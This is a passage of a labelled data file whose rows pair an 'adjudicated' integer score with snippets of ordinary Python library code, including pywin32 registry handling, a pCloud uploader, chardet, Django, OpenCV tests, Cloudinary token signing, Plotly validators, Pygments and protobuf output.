        k, fname, Flags=winnt.REG_STANDARD_FORMAT, SecurityAttributes=sa
    )

    restored_key, disp = win32api.RegCreateKeyEx(
        win32con.HKEY_CURRENT_USER,
        ""Python test key(restored)"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""restored class"",
        Options=0,
    )
    win32api.RegRestoreKey(restored_key, fname)
finally:
    win32security.AdjustTokenPrivileges(th, 0, adjusted_privs)"
74	adjudicated	1	"import sys
import time

import log4p
import pcloud

log = log4p.GetLogger(__name__, config=""log4p.json"").logger


class Uploader:

    def __init__(self, username, password):
        self.pc = pcloud.PyCloud(username, password)
        self.path = '/'

    def is_logged_in(self):
        return len(self.pc.auth_token) > 1

    def set_path(self, path):
        self.pc.createfolderifnotexists(path=path)
        self.path = path

    def upload(self, file):
        response = self.pc.uploadfile(files=[file], path=self.path)
        log.debug(response)
        if response['result'] == 0:
            log.info('Uploaded the file  %s file to pcloud %s', file, self.path)
            time.sleep(1)
            return
        log.error(""Was not able to upload to pcloud"")
        sys.exit(response['result'])

    def get_checksum(self, file):
        response = self.pc.checksumfile(path=self.path+'/'+file)
        log.debug(response)
        return response['sha1']

    def is_file_present(self, file):
        response = self.pc.listfolder(path=self.path)
        log.debug(response)
        dir_content = response['metadata']['contents']
        for item in dir_content:
            if item['name'] == file:
                log.info(""File %s is present in directory %s"", file, self.path)
                return True
        log.info(""File %s not found in directory %s"", file, self.path)
        return False

    def rename_file(self, file, new_name):
        response = self.pc.renamefile(
            path=self.path+'/'+file,
            topath=self.path+'/'+new_name
        )
        log.debug(response)
        if response['result'] == 0:
            log.info(""File %s renamed to %s"", file, new_name)
            time.sleep(1)
            return
        log.error(""Failed to rename file %s to %s"", file, new_name)

    def delete_file(self, file):
        response = self.pc.deletefile(path=self.path+'/'+file)
        log.debug(response)
        if response['result'] == 0:
            log.info(""File %s deleted"", file)
            return
"
134	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .big5prober import Big5Prober
from .charsetgroupprober import CharSetGroupProber
from .cp949prober import CP949Prober
from .eucjpprober import EUCJPProber
from .euckrprober import EUCKRProber
from .euctwprober import EUCTWProber
from .gb2312prober import GB2312Prober
from .johabprober import JOHABProber
from .sjisprober import SJISProber
from .utf8prober import UTF8Prober


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super().__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
            JOHABProber(),
        ]
        self.reset()"
25	adjudicated	0	"from django import forms
from .models import Todo,Assign_task
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.models import User


class TaskForm(forms.ModelForm):
	class Meta:
		model = Todo
		fields = (""task"",""completed"",""created_date"",""deadline"")


class AssignForm(forms.ModelForm):
	class Meta:
		model = Assign_task
		fields = ""__all__""

class NewUserForm(UserCreationForm):
	email = forms.EmailField(required=True)

	class Meta:
		model = User
		fields = (""username"", ""email"", ""password1"", ""password2"")

	def save(self, commit=True):
		user = super(NewUserForm, self).save(commit=False)
		user.email = self.cleaned_data['email']
		if commit:
			user.save()
		return user

'''class AssignTaskForm(forms.Form):
    def __init__(self):              
        self.choice_list = [('test', 'test'),]        
        self.users = User.objects.all()        
        for self.x in self.users:
            self.choice_list.append([self.x.get_username(), self.x.get_username()])        
        self.CHOICES = self.choice_list
        super (AssignTaskForm, self).__init__()
        self.fields['User_choice'].widget = forms.Select(choices=self.CHOICES) 
        
    User_choice = forms.CharField(max_length=100)
    start_date = forms.DateField(widget=forms.SelectDateWidget())
    end_date = forms.DateField(widget=forms.SelectDateWidget())
	Task_Name = forms.CharField(widget=forms.Textarea)'''


class AssignTaskForm(forms.Form):
	def __init__(self):
		self.choice_list = [('test','test'),]
		self.users = User.objects.all()
		for self.x in self.users:
			self.choice_list.append([self.x.get_username(), self.x.get_username()])
		self.CHOICES = self.choice_list 
		super(AssignTaskForm,self).__init__()
		self.fields['SELECT_USER'].widget = forms.Select(choices=self.CHOICES)

	Task_Name = forms.CharField(widget = forms.TextInput)
	SELECT_USER = forms.CharField(max_length = 100)
	start_date = forms.DateField(widget=forms.SelectDateWidget())
	end_date = forms.DateField(widget=forms.SelectDateWidget())"
165	adjudicated	1	"#!/usr/bin/python

'''
This example illustrates how to use Hough Transform to find lines
'''

# Python 2/3 compatibility
from __future__ import print_function

import cv2 as cv
import numpy as np
import sys
import math

from tests_common import NewOpenCVTests

def linesDiff(line1, line2):

    norm1 = cv.norm(line1 - line2, cv.NORM_L2)
    line3 = line1[2:4] + line1[0:2]
    norm2 = cv.norm(line3 - line2, cv.NORM_L2)

    return min(norm1, norm2)

class houghlines_test(NewOpenCVTests):

    def test_houghlines(self):

        fn = ""/samples/data/pic1.png""

        src = self.get_sample(fn)
        dst = cv.Canny(src, 50, 200)

        lines = cv.HoughLinesP(dst, 1, math.pi/180.0, 40, np.array([]), 50, 10)[:,0,:]

        eps = 5
        testLines = [
            #rect1
             [ 232,  25, 43, 25],
             [ 43, 129, 232, 129],
             [ 43, 129,  43,  25],
             [232, 129, 232,  25],
            #rect2
             [251,  86, 314, 183],
             [252,  86, 323,  40],
             [315, 183, 386, 137],
             [324,  40, 386, 136],
            #triangle
             [245, 205, 377, 205],
             [244, 206, 305, 278],
             [306, 279, 377, 205],
            #rect3
             [153, 177, 196, 177],
             [153, 277, 153, 179],
             [153, 277, 196, 277],
             [196, 177, 196, 277]]

        matches_counter = 0

        for i in range(len(testLines)):
            for j in range(len(lines)):
                if linesDiff(testLines[i], lines[j]) < eps:
                    matches_counter += 1

        self.assertGreater(float(matches_counter) / len(testLines), .7)

        lines_acc = cv.HoughLinesWithAccumulator(dst, rho=1, theta=np.pi / 180, threshold=150, srn=0, stn=0)
        self.assertEqual(lines_acc[0,0,2], 192.0)
        self.assertEqual(lines_acc[1,0,2], 187.0)

if __name__ == '__main__':
    NewOpenCVTests.bootstrap()"
262	adjudicated	1	"import hashlib
import hmac
import re
import time
from binascii import a2b_hex


AUTH_TOKEN_NAME = ""__cld_token__""
AUTH_TOKEN_SEPARATOR = ""~""
AUTH_TOKEN_UNSAFE_RE = r'([ ""#%&\'\/:;<=>?@\[\\\]^`{\|}~]+)'


def generate(url=None, acl=None, start_time=None, duration=None,
             expiration=None, ip=None, key=None, token_name=AUTH_TOKEN_NAME):

    if expiration is None:
        if duration is not None:
            start = start_time if start_time is not None else int(time.time())
            expiration = start + duration
        else:
            raise Exception(""Must provide either expiration or duration"")

    if url is None and acl is None:
        raise Exception(""Must provide either acl or url"")

    token_parts = []
    if ip is not None:
        token_parts.append(""ip="" + ip)
    if start_time is not None:
        token_parts.append(""st=%d"" % start_time)
    token_parts.append(""exp=%d"" % expiration)
    if acl is not None:
        acl_list = acl if type(acl) is list else [acl]
        acl_list = [_escape_to_lower(a) for a in acl_list] 
        token_parts.append(""acl=%s"" % ""!"".join(acl_list))
    to_sign = list(token_parts)
    if url is not None and acl is None:
        to_sign.append(""url=%s"" % _escape_to_lower(url))
    auth = _digest(AUTH_TOKEN_SEPARATOR.join(to_sign), key)
    token_parts.append(""hmac=%s"" % auth)
    return ""%(token_name)s=%(token)s"" % {""token_name"": token_name, ""token"": AUTH_TOKEN_SEPARATOR.join(token_parts)}


def _digest(message, key):
    bin_key = a2b_hex(key)
    return hmac.new(bin_key, message.encode('utf-8'), hashlib.sha256).hexdigest()


def _escape_to_lower(url):
    # There is a circular import issue in this file, need to resolve it in the next major release
    from cloudinary.utils import smart_escape
    escaped_url = smart_escape(url, unsafe=AUTH_TOKEN_UNSAFE_RE)
    escaped_url = re.sub(r""%[0-9A-F]{2}"", lambda x: x.group(0).lower(), escaped_url)
    return escaped_url"
322	adjudicated	4	"""""""
Mozilla Persona authentication backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/persona.html
""""""
from ..exceptions import AuthFailed, AuthMissingParameter
from ..utils import handle_http_errors
from .base import BaseAuth


class PersonaAuth(BaseAuth):
    """"""BrowserID authentication backend""""""
    name = 'persona'

    def get_user_id(self, details, response):
        """"""Use BrowserID email as ID""""""
        return details['email']

    def get_user_details(self, response):
        """"""Return user details, BrowserID only provides Email.""""""
        # {'status': 'okay',
        #  'audience': 'localhost:8000',
        #  'expires': 1328983575529,
        #  'email': 'name@server.com',
        #  'issuer': 'browserid.org'}
        email = response['email']
        return {'username': email.split('@', 1)[0],
                'email': email,
                'fullname': '',
                'first_name': '',
                'last_name': ''}

    def extra_data(self, user, uid, response, details=None, *args, **kwargs):
        """"""Return users extra data""""""
        return {'audience': response['audience'],
                'issuer': response['issuer']}

    @handle_http_errors
    def auth_complete(self, *args, **kwargs):
        """"""Completes login process, must return user instance""""""
        if 'assertion' not in self.data:
            raise AuthMissingParameter(self, 'assertion')

        response = self.get_json('https://browserid.org/verify', data={
            'assertion': self.data['assertion'],
            'audience': self.strategy.request_host()
        }, method='POST')
        if response.get('status') == 'failure':
            raise AuthFailed(self)
        kwargs.update({'response': response, 'backend': self})
        return self.strategy.authenticate(*args, **kwargs)"
233	adjudicated	2	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
151	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""heatmapgl"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
380	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .big5prober import Big5Prober
from .charsetgroupprober import CharSetGroupProber
from .cp949prober import CP949Prober
from .enums import LanguageFilter
from .eucjpprober import EUCJPProber
from .euckrprober import EUCKRProber
from .euctwprober import EUCTWProber
from .gb2312prober import GB2312Prober
from .johabprober import JOHABProber
from .sjisprober import SJISProber
from .utf8prober import UTF8Prober


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter: LanguageFilter = LanguageFilter.NONE) -> None:
        super().__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
            JOHABProber(),
        ]
        self.reset()"
11	adjudicated	1	"""""""
    pygments.lexers.capnproto
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Cap'n Proto schema language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, default
from pygments.token import Text, Comment, Keyword, Name, Literal, Whitespace

__all__ = ['CapnProtoLexer']


class CapnProtoLexer(RegexLexer):
    """"""
    For Cap'n Proto source.

    .. versionadded:: 2.2
    """"""
    name = 'Cap\'n Proto'
    url = 'https://capnproto.org'
    filenames = ['*.capnp']
    aliases = ['capnp']

    tokens = {
        'root': [
            (r'#.*?$', Comment.Single),
            (r'@[0-9a-zA-Z]*', Name.Decorator),
            (r'=', Literal, 'expression'),
            (r':', Name.Class, 'type'),
            (r'\$', Name.Attribute, 'annotation'),
            (r'(struct|enum|interface|union|import|using|const|annotation|'
             r'extends|in|of|on|as|with|from|fixed)\b',
             Keyword),
            (r'[\w.]+', Name),
            (r'[^#@=:$\w\s]+', Text),
            (r'\s+', Whitespace),
        ],
        'type': [
            (r'[^][=;,(){}$]+', Name.Class),
            (r'[\[(]', Name.Class, 'parentype'),
            default('#pop'),
        ],
        'parentype': [
            (r'[^][;()]+', Name.Class),
            (r'[\[(]', Name.Class, '#push'),
            (r'[])]', Name.Class, '#pop'),
            default('#pop'),
        ],
        'expression': [
            (r'[^][;,(){}$]+', Literal),
            (r'[\[(]', Literal, 'parenexp'),
            default('#pop'),
        ],
        'parenexp': [
            (r'[^][;()]+', Literal),
            (r'[\[(]', Literal, '#push'),
            (r'[])]', Literal, '#pop'),
            default('#pop'),
        ],
        'annotation': [
            (r'[^][;,(){}=:]+', Name.Attribute),
            (r'[\[(]', Name.Attribute, 'annexp'),
            default('#pop'),
        ],
        'annexp': [
            (r'[^][;()]+', Name.Attribute),
            (r'[\[(]', Name.Attribute, '#push'),
            (r'[])]', Name.Attribute, '#pop'),
            default('#pop'),
        ],
    }"
291	adjudicated	4	"from django import template
from django.contrib.admin.models import LogEntry

register = template.Library()


class AdminLogNode(template.Node):
    def __init__(self, limit, varname, user):
        self.limit, self.varname, self.user = limit, varname, user

    def __repr__(self):
        return ""<GetAdminLog Node>""

    def render(self, context):
        if self.user is None:
            entries = LogEntry.objects.all()
        else:
            user_id = self.user
            if not user_id.isdigit():
                user_id = context[self.user].pk
            entries = LogEntry.objects.filter(user__pk=user_id)
        context[self.varname] = entries.select_related('content_type', 'user')[:int(self.limit)]
        return ''


@register.tag
def get_admin_log(parser, token):
    """"""
    Populate a template variable with the admin log for the given criteria.

    Usage::

        {% get_admin_log [limit] as [varname] for_user [context_var_containing_user_obj] %}

    Examples::

        {% get_admin_log 10 as admin_log for_user 23 %}
        {% get_admin_log 10 as admin_log for_user user %}
        {% get_admin_log 10 as admin_log %}

    Note that ``context_var_containing_user_obj`` can be a hard-coded integer
    (user ID) or the name of a template context variable containing the user
    object whose ID you want.
    """"""
    tokens = token.contents.split()
    if len(tokens) < 4:
        raise template.TemplateSyntaxError(
            ""'get_admin_log' statements require two arguments"")
    if not tokens[1].isdigit():
        raise template.TemplateSyntaxError(
            ""First argument to 'get_admin_log' must be an integer"")
    if tokens[2] != 'as':
        raise template.TemplateSyntaxError(
            ""Second argument to 'get_admin_log' must be 'as'"")
    if len(tokens) > 4:
        if tokens[4] != 'for_user':
            raise template.TemplateSyntaxError(
                ""Fourth argument to 'get_admin_log' must be 'for_user'"")
    return AdminLogNode(limit=tokens[1], varname=tokens[3], user=(tokens[5] if len(tokens) > 5 else None))"
100	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""icicle"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
40	adjudicated	1	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/Favicon.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/Favicon.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1dstreamlit/proto/Favicon.proto\""\x16\n\x07\x46\x61vicon\x12\x0b\n\x03url\x18\x01 \x01(\tb\x06proto3'
)




_FAVICON = _descriptor.Descriptor(
  name='Favicon',
  full_name='Favicon',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='url', full_name='Favicon.url', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=33,
  serialized_end=55,
)

DESCRIPTOR.message_types_by_name['Favicon'] = _FAVICON
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Favicon = _reflection.GeneratedProtocolMessageType('Favicon', (_message.Message,), {
  'DESCRIPTOR' : _FAVICON,
  '__module__' : 'streamlit.proto.Favicon_pb2'
  # @@protoc_insertion_point(class_scope:Favicon)
  })
_sym_db.RegisterMessage(Favicon)


# @@protoc_insertion_point(module_scope)"
